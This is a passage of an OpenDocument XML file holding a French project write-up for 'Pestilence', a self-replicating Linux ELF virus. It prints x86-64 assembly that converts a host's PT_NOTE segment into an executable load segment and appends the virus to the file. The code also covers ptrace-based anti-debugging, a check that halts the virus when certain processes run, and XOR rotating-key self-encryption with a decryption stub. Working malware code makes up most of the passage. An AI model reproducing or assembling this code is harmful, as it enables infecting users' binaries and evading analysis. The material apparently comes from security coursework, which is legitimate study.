      <text:p text:style-name="P10"><text:span text:style-name="T16">.</text:span><text:span text:style-name="T18">segments:</text:span></text:p>
      <text:p text:style-name="P10"><text:soft-page-break/><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_ehdr.e_phoff</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">r11</text:span><text:span text:style-name="T20">, [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">]<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Storing e_phoff in r11</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_ehdr.e_phnum - elf64_ehdr.e_phoff</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">movzx </text:span><text:span text:style-name="T16">r14</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">word</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">]<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Storing e_phnum in r14</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">dec </text:span><text:span text:style-name="T16">r14</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">r11</text:span><text:span text:style-name="T20"> <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; rax @ segment headers in file</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">xor </text:span><text:span text:style-name="T16">r13</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">r13</text:span><text:span text:style-name="T20"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Loop counter</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P8">; === Finding the first NOTE segment in file ===</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T16">.</text:span><text:span text:style-name="T18">phnum_loop:</text:span></text:p>
      <text:p text:style-name="P9">call _check_note</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">cmp </text:span><text:span text:style-name="T16">r13</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">r14</text:span></text:p>
      <text:p text:style-name="P9">jge _end_file_infection</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr_size</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">inc </text:span><text:span text:style-name="T16">r13</text:span></text:p>
      <text:p text:style-name="P9">jmp _file.phnum_loop</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">&gt; Une fois le segment PT_NOTE trouvé, on le patch :</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P43">; === Patch note segment header ===</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rdi</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">dword</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T22">0x1</text:span><text:span text:style-name="T20"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Convert to PT_LOAD</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr.p_flags</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">dword</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T22">0x7</text:span><text:span text:style-name="T20"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Permissions to R W E</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr.p_offset - elf64_phdr.p_flags</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20">, FAM(famine.fsize)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T16">rdi<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Offset --&gt; very end of the file</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr.p_vaddr - elf64_phdr.p_offset</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20">, FAM(famine.fsize)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T22">0xc000000<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Virtual address --&gt; 0xc000000</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T16">rdi</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr.p_paddr - elf64_phdr.p_vaddr</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T16">rdi<text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Same for physical address</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr.p_filesz - elf64_phdr.p_paddr</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">qword</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], PAGE_SIZE<text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Size of segment in file : 4096 bytes</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, elf64_phdr.p_memsz - elf64_phdr.p_filesz</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">qword</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], PAGE_SIZE<text:tab/><text:tab/></text:span><text:span text:style-name="T21">; Size of segment in memory : 4096 bytes</text:span></text:p>
      <text:p text:style-name="P45"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Quelques remarques :</text:p>
      <text:list xml:id="list4941256734154909323" text:style-name="L11">
        <text:list-item>
          <text:p text:style-name="P26"><text:span text:style-name="T2">On a besoin de </text:span><text:span text:style-name="T1">R W E</text:span><text:span text:style-name="T2"> (et pas seulement read-execute) car on va encrypter le virus et faire en sortes qu'il se décrypte lui-même au runtime, on a donc besoin que le segment qui le stock soit writable.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P26"><text:span text:style-name="T2">L'offset désigne </text:span><text:span text:style-name="T1">la fin du fichier originel</text:span><text:span text:style-name="T2">, car en effet on va simplement étendre le fichier originel de 4096 et placer notre virus tout à la fin, notre segment modifié va charger les données qui se situent à cet emplacement du fichier (au lieu des sections qu'il charge actuellement).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P26"><text:span text:style-name="T2">L'adresse virtuelle est </text:span><text:span text:style-name="T1">0xc000000</text:span><text:span text:style-name="T2">. J'ai pris ça du tutoriel, cela fonctionne à la fois comme adresse absolue, et additionnée à une adresse de base pour les PIC. Il s'agit par ailleurs d'une adresse suffisamment éloignée pour éviter tout overlap.</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; On écrit l'intégralité du virus à la fin du fichier, qu'on a préalablement étendu avec un </text:span><text:span text:style-name="T1">ftruncate</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P24"><text:soft-page-break/></text:p>
      <text:p text:style-name="P24">&gt; On patch les entry points (voir documentation famine).</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Et on a notre binaire infecté, le virus qu'on a ajouté au fichier est chargé dans notre segment PT_NOTE modifié, à une adresse virtuelle suffisamment éloignée, il est exécuté et redirige le flux d'exécution vers le point d'entrée originel du binaire.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Remarquons qu'avec cette technique, nous n'avons </text:span><text:span text:style-name="T1">rien à déplacer</text:span><text:span text:style-name="T2">, puisque nous n'insérons rien au milieu du fichier : on ne fait que patcher des valeurs d'un segment existant, puis le pointer vers notre payload qu'on a ajouter à la fin du fichier (et qui ne déplace donc pas les données qui le suivraient).</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P7">REMARQUES<text:span text:style-name="T2"> </text:span>SUR L'INFECTION<text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt; La méthode d'infection via le segment PT_NOTE </text:span>ne fonctionne pas sur les binaires ELF compilés avec GO<text:span text:style-name="T2">. En effet, GO stock des informations importantes dans le segment PT_NOTE, qu'il utilise ensuite à l'exécution du programme. Il s'agit notamment du </text:span>build ID<text:span text:style-name="T2">, contenu dans la section </text:span>.note.go.buildid<text:span text:style-name="T2">. Tenter d'overwrite le segment PT_NOTE avec notre virus provoquera une </text:span>segmentation fault<text:span text:style-name="T2"> de ces binaires.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P7"><text:span text:style-name="T2">C'est pourquoi on a implémenté un check supplémentaire, qui vérifie si le fichier qu'on souhaite traiter est un fichier ayant été compilé avec GO. Si c'est bien le cas, on n'infecte pas ce fichier. Pour déterminer si le fichier a été compilé en GO, on vérifie simplement la présence d'une section nommée "</text:span>.note.go.buildid<text:span text:style-name="T2">" ; si l'on trouve une section avec ce nom, on ignore le fichier.</text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T2">L'implémentation est faîte dans </text:span>_file.go<text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt; Par rapport à famine et strife, notre syscall </text:span>getdents<text:span text:style-name="T2"> est effectué en boucle jusqu'à ce que le syscall renvoie 0, afin de lister l'intégralité des fichiers du dossier.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P7"><text:span text:style-name="T2">&gt; On utilise désormais </text:span>remap<text:span text:style-name="T2"> suite à notre </text:span>ftruncate<text:span text:style-name="T2">, ce qui nous évite de devoir détruire le premier mapping et d'en re-créer un, on modifie simplement le mapping original (en précisant le flag </text:span>MREMAP_MAYMOVE<text:span text:style-name="T2"> permettant au syscall de relocaliser notre mapping s'il n'y a pas assez de place pour l'étendre à l'emplacement originel).</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt;&gt; </text:span><text:span text:style-name="T1">OBFUSCATION</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Maintenant que notre méthode d'infection nous laisse de la place (4096 bytes, mais on pourrait étendre plus largement le fichier et augmenter de même la taille de notre segment PT_NOTE modifié), on peut se pencher sur le procédé d'obfuscation.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:list xml:id="list4974316156797509786" text:style-name="L12">
        <text:list-item>
          <text:p text:style-name="P35">Anti-debugging protection</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Comme mentionné en introduction, une des mesures d'obfuscation à implémenter était un mécanisme qui permet au fichier infecté de ne pas exécuter le virus lorsque le fichier est lancé avec un </text:span><text:span text:style-name="T1">debugger</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:soft-page-break/><text:span text:style-name="T2">On utilise très simplement un syscall </text:span><text:span text:style-name="T1">ptrace</text:span><text:span text:style-name="T2"> pour cela : en effet, le syscall suivant permet à un processus d'être tracé par son processus parent :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P39">ptrace(PTRACE_TRACEME)</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Or, un processus </text:span><text:span text:style-name="T1">ne peut avoir qu'un seul "tracer"</text:span><text:span text:style-name="T2"> (programme qui le trace). Ainsi, lorsqu'on va essayer d'exécuter le virus </text:span><text:span text:style-name="T1">avec n'importe quel type de debugger</text:span><text:span text:style-name="T2">, le syscall affiché ci-dessus va renvoyer -1 : en effet, le debugger sera déjà en train de tracer le programme, ce qui provoque l'échec du syscall. On sait alors que le binaire infecté est en train d'être débuggé, et on n'exécute pas le virus, on rend directement le contrôle au programme légitime :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P43">; === Anti-debug protection ===</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">xor </text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rdi<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; PTRACE_TRACEME</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, SYS_PTRACE</text:span></text:p>
      <text:p text:style-name="P9">syscall</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">cmp </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, -</text:span><text:span text:style-name="T22">1</text:span></text:p>
      <text:p text:style-name="P9">je _debugging</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:list xml:id="list7195860365248625225" text:style-name="L13">
        <text:list-item>
          <text:p text:style-name="P36">Forbidden processes</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">Une autre mesure d'obfuscation consistait à empêcher l'exécution du virus lorsqu'un processus spécifique est actif sur la machine cible. On a choisi deux processus interdits :</text:p>
      <text:list xml:id="list4503420748977539419" text:style-name="L14">
        <text:list-item>
          <text:p text:style-name="P40">sleep</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P40">fortytwo</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Si l'un de ces processus tourne sur la machine cible lorsqu'on tente d'exécuter un fichier infecté, le virus ne s'exécute pas et re-donne directement le contrôle au programme légitime. La façon standard de vérifier la présence d'un processus actif est de parcourir le </text:span><text:span text:style-name="T1">dossier /proc</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P6"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/939778/linux-api-to-list-running-processes" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2">https://stackoverflow.com/questions/939778/linux-api-to-list-running-processes</text:span></text:a><text:span text:style-name="T2"> </text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">C'est la technique utilisée par </text:span><text:span text:style-name="T1">ps</text:span><text:span text:style-name="T2"> et les autres outils qui ont besoin d'accéder aux processus de la machine. Du coup, ce que l'on fait dans </text:span><text:span text:style-name="T1">_traverse_proc</text:span><text:span text:style-name="T2"> :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; On parcourt le dossier </text:span><text:span text:style-name="T1">/proc</text:span><text:span text:style-name="T2"> avec une boucle getdents.</text:span></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; Pour chaque </text:span><text:span text:style-name="T1">dossier</text:span><text:span text:style-name="T2">, on appelle _check_process.</text:span></text:p>
      <text:p text:style-name="P24">&gt; On vérifie si le dossier commence par un chiffre (les dossiers contenant les processus commencent par un chiffre, puisqu'ils ont pour nom le PID du processus).</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; Si c'est le cas, on tente de lire le fichier </text:span><text:span text:style-name="T1">comm</text:span><text:span text:style-name="T2"> qui contient le nom de la commande associée avec le processus (</text:span><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man5/proc.5.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2">https://man7.org/linux/man-pages/man5/proc.5.html</text:span></text:a><text:span text:style-name="T2">)</text:span></text:p>
      <text:p text:style-name="P24">&gt; On compare le contenu du fichier avec nos processus interdits. Si on a un match, un des processus interdits tourne sur la machine cible, on quitte le virus.</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:list xml:id="list7099619535329305048" text:style-name="L15">
        <text:list-item>
          <text:p text:style-name="P37">Executable instructions obfuscation</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24">La dernière exigence du sujet était l'obfuscation des instructions du virus en elles-mêmes. Plusieurs méchanismes permettent de rendre complexe la compréhension du virus :</text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; Premièrement, celui-ci a été rédigé en </text:span><text:span text:style-name="T1">custom assembly</text:span><text:span text:style-name="T2"> (et non en C/C++). Cela rend sa </text:span><text:span text:style-name="T1">décompilation</text:span><text:span text:style-name="T2"> (avec des outils comme </text:span><text:span text:style-name="T1">ghidra </text:span><text:span text:style-name="T2">ou </text:span><text:span text:style-name="T1">cutter</text:span><text:span text:style-name="T2">) entièrement inutile. Voici un exemple de l'output de ghidra sur une partie des instructions du virus :</text:span></text:p>
      <text:p text:style-name="P24"><text:soft-page-break/></text:p>
      <text:p text:style-name="P24"><draw:frame draw:style-name="fr3" draw:name="images3" text:anchor-type="paragraph" svg:width="16.327cm" svg:height="8.043cm" draw:z-index="2"><draw:image xlink:href="Pictures/2000000700003FC600001F6C07F19DB8.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T2">Le code que ghidra tente de décompiler est de l'assembly pure, et il se retrouve incapable de reconstruire correctement une structure compréhensible, son </text:span><text:span text:style-name="T6">engine</text:span><text:span text:style-name="T2"> ayant été conçu pour de la décompilation de langages de plus haut niveau.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P6"><text:span text:style-name="T2">&gt; La deuxième mesure d'obfuscation est </text:span><text:span text:style-name="T1">l'encryption du virus utilisant une clé aléatoire rotative</text:span><text:span text:style-name="T2">. Lorsque le virus s'écrit lui-même dans le fichier cible, il s'écrit de façon </text:span><text:span text:style-name="T1">encryptée</text:span><text:span text:style-name="T2"> (sauf le </text:span><text:span text:style-name="T6">stub</text:span><text:span text:style-name="T2"> au début qui lui permettra de se décrypter lui-même avant de s'exécuter, et la signature + la clé d'encryption à la fin) :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P43">; === Path the enc_key with 8 random bytes, and use these bytes to encrypt the virus ===</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T16">.</text:span><text:span text:style-name="T18">patch_key:</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">push </text:span><text:span text:style-name="T16">rdi<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">;rdi at end of virus</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">lea </text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20">, [</text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20"> - </text:span><text:span text:style-name="T22">24</text:span><text:span text:style-name="T20">]</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rsi</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T22">0x8</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">xor </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rdx</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, SYS_GETRANDOM</text:span></text:p>
      <text:p text:style-name="P9">syscall<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:span text:style-name="T21">; 8 random bytes in enc_key (end of virus)</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T20">pop </text:span><text:span text:style-name="T16">rdi</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20">, [</text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20"> - </text:span><text:span text:style-name="T22">24</text:span><text:span text:style-name="T20">]</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">inc </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20"> <text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T21">; So key can't ever be 0x0000000000000000 </text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov [</text:span><text:span text:style-name="T16">rdi</text:span><text:span text:style-name="T20"> - </text:span><text:span text:style-name="T22">24</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T16">rdx</text:span></text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P8">; === Encrypt the virus ===</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, FAM(famine.map_ptr)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, FAM(famine.fsize)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, (_start.enc_start - _start)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rcx</text:span><text:span text:style-name="T20">, (_enc_end - _start.enc_start)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rcx</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rax</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T16">.</text:span><text:span text:style-name="T18">encrypt:</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">xor </text:span><text:span text:style-name="T16">byte</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T16">dl</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">ror </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T22">8</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">inc </text:span><text:span text:style-name="T16">rax</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">cmp </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rcx</text:span></text:p>
      <text:p text:style-name="P9">jne .encrypt</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"><text:soft-page-break/>[...SNIP...]</text:p>
      <text:p text:style-name="P13">_enc_end:</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">signature<text:tab/></text:span><text:span text:style-name="T16">db</text:span><text:span text:style-name="T20"> "Pestilence version </text:span><text:span text:style-name="T22">1.0</text:span><text:span text:style-name="T20"> (c)oded by qroland",</text:span><text:span text:style-name="T22">0x0</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">enc_key<text:tab/></text:span><text:span text:style-name="T16">dq</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T22">0x000000000000000</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">host_entry<text:tab/></text:span><text:span text:style-name="T16">dq</text:span><text:span text:style-name="T20"> _exit</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">virus_entry<text:tab/></text:span><text:span text:style-name="T16">dq</text:span><text:span text:style-name="T20"> _start</text:span></text:p>
      <text:p text:style-name="P14">_finish:</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P5"><text:span text:style-name="T2">L'algorithme d'encryption est le même que woody. On commence par générer </text:span><text:span text:style-name="T1">8 bytes aléatoires</text:span><text:span text:style-name="T2"> qu'on stock dans la variable </text:span><text:span text:style-name="T1">enc_key</text:span><text:span text:style-name="T2">. On place </text:span><text:span text:style-name="T1">rax </text:span><text:span text:style-name="T2">à </text:span><text:span text:style-name="T1">_file.enc_start</text:span><text:span text:style-name="T2">, puis </text:span><text:span text:style-name="T1">rcx </text:span><text:span text:style-name="T2">à </text:span><text:span text:style-name="T1">_enc_end</text:span><text:span text:style-name="T2">, puis on </text:span><text:span text:style-name="T1">xor</text:span><text:span text:style-name="T2"> chaque byte à l'adresse de </text:span><text:span text:style-name="T1">rax</text:span><text:span text:style-name="T2">, on </text:span><text:span text:style-name="T6">rotate</text:span><text:span text:style-name="T14"> la clé, et on passe au byte suivant, jusqu'à ce que </text:span><text:span text:style-name="T15">rax == rcx</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P5"><text:span text:style-name="T14">Au début du virus, ce dernier se décrypte lui-même dans son </text:span><text:span text:style-name="T7">stub</text:span><text:span text:style-name="T14"> avant de s'exécuter :</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P12"><text:span text:style-name="T17">.</text:span><text:span text:style-name="T19">stub:</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20">, [</text:span><text:span text:style-name="T16">rel</text:span><text:span text:style-name="T20"> enc_key]</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">cmp </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T22">0x0</text:span></text:p>
      <text:p text:style-name="P9">je _start.enc_start</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">lea </text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">, [</text:span><text:span text:style-name="T16">rel</text:span><text:span text:style-name="T20"> _start.enc_start]</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">mov </text:span><text:span text:style-name="T16">rcx</text:span><text:span text:style-name="T20">, (_enc_end - _start.enc_start)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">add </text:span><text:span text:style-name="T16">rcx</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T16">rax</text:span></text:p>
      <text:p text:style-name="P46"/>
      <text:p text:style-name="P10"><text:span text:style-name="T16">.</text:span><text:span text:style-name="T18">decrypt:</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">xor </text:span><text:span text:style-name="T16">byte</text:span><text:span text:style-name="T20"> [</text:span><text:span text:style-name="T16">rax</text:span><text:span text:style-name="T20">], </text:span><text:span text:style-name="T16">dl</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T20">ror </text:span><text:span text:style-name="T16">rdx</text:span><text:span text:style-name="T20">, </text:span><text:span text:style-name="T22">8</text:span></text:p>
